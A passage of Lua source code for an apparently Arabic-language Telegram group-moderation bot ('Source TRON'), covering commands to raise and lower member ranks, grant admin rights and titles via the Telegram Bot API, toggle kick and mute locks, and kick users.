if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(user) == tonumber(admins[i].user_id_) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevAbd:srem(TRON..'Abd:AbdConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من المالكين")  
end end end
end,nil)
end end
--     Source TRON     --
--  Set BasicConstructor  --
if AbdConstructor(msg) then
if text ==('رفع منشئ اساسي') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevAbd:sadd(TRON..'Abd:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:sadd(TRON..'Abd:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه منشئ اساسي")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ اساسي (%d+)') and SourceCh(msg) then
local user = text:match('رفع منشئ اساسي (%d+)')
DevAbd:sadd(TRON..'Abd:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه منشئ اساسي")  
end
--     Source TRON     --
--  Rem BasicConstructor  --
if text ==('تنزيل منشئ اساسي') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbd:srem(TRON..'Abd:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:srem(TRON..'Abd:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله منشئ اساسي")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ اساسي (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منشئ اساسي (%d+)')
DevAbd:srem(TRON..'Abd:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله منشئ اساسي")  
end end
if text ==('رفع منشئ اساسي') and not AbdConstructor(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر للمالكين والمطورين فقط', 1, 'md')
end
--     Source TRON     --
--    Set  Constructor    --
if BasicConstructor(msg) then
if text ==('رفع منشئ') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevAbd:sadd(TRON..'Abd:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:sadd(TRON..'Abd:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المنشئين")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ (%d+)') and SourceCh(msg) then
local user = text:match('رفع منشئ (%d+)')
DevAbd:sadd(TRON..'Abd:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المنشئين")  
end
--     Source TRON     --
--    Rem  Constructor    --
if text ==('تنزيل منشئ') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbd:srem(TRON..'Abd:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:srem(TRON..'Abd:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المنشئين")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منشئ (%d+)')
DevAbd:srem(TRON..'Abd:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المنشئين")  
end 
end
--     Source TRON     --
--      Set Manager       --
if Constructor(msg) then
if text ==('رفع مدير') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbd:sadd(TRON..'Abd:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المدراء")  
end  
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:sadd(TRON..'Abd:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المدراء")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^رفع مدير (%d+)') and SourceCh(msg) then
local user = text:match('رفع مدير (%d+)')
DevAbd:sadd(TRON..'Abd:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المدراء")  
end
--     Source TRON     --
--       Rem Manager      --
if text ==('تنزيل مدير') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المدراء")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المدراء")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مدير (%d+)')
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المدراء")  
end 
--     Source TRON     --
--       Set Cleaner      --
if text ==('رفع منظف') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbd:sadd(TRON..'Abd:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع منظف @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:sadd(TRON..'Abd:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المنظفين")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منظف (%d+)') and SourceCh(msg) then
local user = text:match('رفع منظف (%d+)')
DevAbd:sadd(TRON..'Abd:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المنظفين")  
end
--     Source TRON     --
--       Rem Cleaner      --
if text ==('تنزيل منظف') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbd:srem(TRON..'Abd:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منظف @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:srem(TRON..'Abd:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المنظفين")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منظف (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منظف (%d+)')
DevAbd:srem(TRON..'Abd:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المنظفين")  
end end
--     Source TRON     --
--       Set admin        --
if Manager(msg) then
if text ==('رفع ادمن') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and DevAbd:get(TRON.."Abd:Lock:ProSet"..msg.chat_id_) then 
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbd:sadd(TRON..'Abd:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and SourceCh(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and DevAbd:get(TRON.."Abd:Lock:ProSet"..msg.chat_id_) then 
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
DevAbd:sadd(TRON..'Abd:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن (%d+)') and SourceCh(msg) then
local user = text:match('رفع ادمن (%d+)')
if not BasicConstructor(msg) and DevAbd:get(TRON.."Abd:Lock:ProSet"..msg.chat_id_) then 
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbd:sadd(TRON..'Abd:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة الادمنيه")  
end
--     Source TRON     --
--        Rem admin       --
if text ==('تنزيل ادمن') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل ادمن (%d+)')
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة الادمنيه")  
end end
--     Source TRON     --
--       Set Vipmem       --
if Admin(msg) then
if text ==('رفع مميز') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and DevAbd:get(TRON.."Abd:Lock:ProSet"..msg.chat_id_) then 
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbd:sadd(TRON..'Abd:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and DevAbd:get(TRON.."Abd:Lock:ProSet"..msg.chat_id_) then 
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
DevAbd:sadd(TRON..'Abd:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المميزين")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز (%d+)') and SourceCh(msg) then
local user = text:match('رفع مميز (%d+)')
if not BasicConstructor(msg) and DevAbd:get(TRON.."Abd:Lock:ProSet"..msg.chat_id_) then 
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbd:sadd(TRON..'Abd:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المميزين")  
end
--     Source TRON     --
--       Rem Vipmem       --
if text ==('تنزيل مميز') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المميزين")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مميز (%d+)')
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المميزين")  
end end 
--     Source TRON     --
if BasicConstructor(msg) then
if text and text:match("^رفع مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..TRON)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه مشرف في المجموعه")  
else
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..TRON)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من مشرفين المجموعه")  
else
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text and (text:match("^رفع بكل الصلاحيات$") or text:match("^رفع بكل صلاحيات$")) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..TRON)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه مشرف في جميع الصلاحيات")  
else
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and (text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")) and ChCheck(msg) then
local Abd = text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")
function ReplySet(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..TRON)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
https.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم اضافة ↫ "..Abd.." كلقب له")  
https.request("https://api.telegram.org/bot"..TokenBot.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&custom_title="..Abd)
else
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplySet)
end
end
end
if text == 'لقبه' then
function ReplyGet(extra, result, success)
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) == false then
send(msg.chat_id_, msg.id_,'⌁︙ليس لديه لقب هنا') 
else
send(msg.chat_id_, msg.id_,'⌁︙لقبه ↫ '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)) 
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplyGet)
end
end
if text == 'لقبي' then
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) == false then
send(msg.chat_id_, msg.id_,'⌁︙ليس لديك لقب هنا') 
else
send(msg.chat_id_, msg.id_,'⌁︙لقبك ↫ '..GetCustomTitle(msg.sender_user_id_,msg.chat_id_)) 
end
end
if text == 'نبذتي' or text == 'بايو' then
send(msg.chat_id_, msg.id_,'['..GetBio(msg.sender_user_id_)..']')
end
if text == "راسلني" then
TRONTEAM = {"ها هلاو","انطق","كول حبي","تفضل"};
send(msg.sender_user_id_, 0,TRONTEAM[math.random(#TRONTEAM)])
end
--     Source TRON     --
if text == "صلاحيتي" or text == "صلاحياتي" and ChCheck(msg) then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Validity(msg,msg.sender_user_id_)
end end
if text ==('صلاحيته') or text ==('صلاحياته') and ChCheck(msg) then
function ValidityReply(extra, result, success)
Validity(msg,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ValidityReply)
end end
if text and (text:match('^صلاحيته @(.*)') or text:match('^صلاحياته @(.*)')) and ChCheck(msg) then
local username = text:match('^صلاحيته @(.*)') or text:match('^صلاحياته @(.*)')
function ValidityUser(extra,result,success)
if result.id_ then
Validity(msg,result.id_) 
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,ValidityUser)
end
if text and (text:match('^صلاحيته (%d+)') or text:match('^صلاحياته (%d+)')) and ChCheck(msg) then
local ValidityId = text:match('صلاحيته (%d+)') or text:match('صلاحياته (%d+)')
Validity(msg,ValidityId)  
end
--     Source TRON     --
if Admin(msg) then
if msg.reply_to_message_id_ ~= 0 then
if text and (text:match("^مسح$") or text:match("^حذف$")) and ChCheck(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.reply_to_message_id_})
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف الرساله مع رسالة الامر', 1, 'md')
end end end
--     Source TRON     --
if Constructor(msg) then
if text == "تفعيل الحظر" and ChCheck(msg) or text == "تفعيل الطرد" and ChCheck(msg) then
DevAbd:del(TRON.."Abd:Lock:KickBan"..msg.chat_id_)
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل الطرد والحظر'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
end
if text == "تعطيل الحظر" and ChCheck(msg) or text == "تعطيل الطرد" and ChCheck(msg) then
DevAbd:set(TRON.."Abd:Lock:KickBan"..msg.chat_id_,"true")
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل الطرد والحظر'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
end
if text == "تفعيل الكتم" and ChCheck(msg) or text == "تفعيل التقييد" and ChCheck(msg) then
DevAbd:del(TRON.."Abd:Lock:MuteTked"..msg.chat_id_)
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل الكتم والتقيد'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
end
if text == "تعطيل الكتم" and ChCheck(msg) or text == "تعطيل التقييد" and ChCheck(msg) then
DevAbd:set(TRON.."Abd:Lock:MuteTked"..msg.chat_id_,"true")
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل الكتم والتقيد'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
end
end
if BasicConstructor(msg) then
if text == "تفعيل الرفع" and ChCheck(msg) or text == "تفعيل الترقيه" and ChCheck(msg) then
DevAbd:del(TRON.."Abd:Lock:ProSet"..msg.chat_id_)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم تفعيل رفع ↫ الادمن • المميز', 1, 'md')
end
if text == "تعطيل الرفع" and ChCheck(msg) or text == "تعطيل الترقيه" and ChCheck(msg) then
DevAbd:set(TRON.."Abd:Lock:ProSet"..msg.chat_id_,"true")
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم تعطيل رفع ↫ الادمن • المميز', 1, 'md')
end
end
--     Source TRON     --
--          Kick          --
if Admin(msg) then
if text ==('طرد') and ChCheck(msg) then
function KickReply(extra, result, success)
if not Constructor(msg) and DevAbd:get(TRON.."Abd:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع طرد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⌁︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم طرده من المجموعه")  
end,nil)
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),KickReply)
end end
if text and text:match('^طرد @(.*)') and ChCheck(msg) then
local username = text:match('^طرد @(.*)')
function KickUser(extra,result,success)
if not Constructor(msg) and DevAbd:get(TRON.."Abd:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع طرد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⌁︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم طرده من المجموعه")  
end,nil)
end
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,KickUser)
end
if text and text:match('^طرد (%d+)') and ChCheck(msg) then
local user = text:match('طرد (%d+)')
if not Constructor(msg) and DevAbd:get(TRON.."Abd:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع طرد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
